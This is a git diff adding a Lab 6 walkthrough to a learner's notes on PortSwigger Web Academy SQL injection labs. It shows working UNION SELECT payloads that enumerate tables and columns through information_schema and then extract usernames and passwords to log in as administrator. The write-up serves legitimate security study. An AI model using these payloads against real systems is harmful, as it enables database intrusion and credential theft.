@@ -228,5 +228,60 @@ The response returns the full version string in the product listing → lab solv
 - **`#` vs `--` for comments:** Both work in MySQL, but `--` requires a trailing space (`-- `) to be valid.
 - **`@@version`** works for both MySQL and MSSQL – same payload, different from Oracle's `BANNER FROM v$version`
 
+---
+
+## Lab 6 – SQL injection attack, listing the database contents on non-Oracle databases
+ 
+**Goal:** Recieve the username and passwords of all users and log in as administrator afterwards.
+ 
+### What's happening under the hood
+ 
+Same approach as Lab 4&5
+ 
+**Step 1 – Determine column count using Burp Suite Repeater**
+ 
+Intercept a category filter request and send it to Repeater. 
+ 
+```
+'+UNION+SELECT+'a','b'#
+```
+ 
+No error → the query returns **2 columns**, both accepting strings.
+ 
+**Step 2 – Extract the table names**
+
+To identify in which table username and passwords are found, a list of every table name is required 
+
+```
+'+UNION+SELECT+table_name,+null+from+information_schema.tables--+
+```
+ 
+The response returns every name of every table in the DB
+
+**Step 3 - Identify the correct column**
+
+Under the table-names there is one specific one which stands out. It is **`users_jnpmfr`**
+Too see if the assumption is correct, the following command can be used to see what Columns the table has
+```
+'+UNION+SELECT+column_name,+null+from+information_schema.columns+where+table_name='users_jnpmfr'--+
+
+```
+**Step 4 - Extract usernames and passwords**
+
+2 different columns are raising attention: **`username_kfvudi`** and **`password_hjhrax`**
+
+To see the values of the columns, following command can be used:
+
+```
+'+UNION+SELECT+username_kfvudi,+password_hjhrax+from+users_jnpmfr--+ 
+```
+
+Finally: Administrator has a password column with the correct password stored. Both can be used to log in afterwards and the Lab is solved.
+
+### Key Takeaways
+ 
+- Thanks to `information_schema` it is possible to recieve table and column names 
+
+
 
 *Source: [PortSwigger Web Academy – SQL Injection](https://portswigger.net/web-security/sql-injection)*
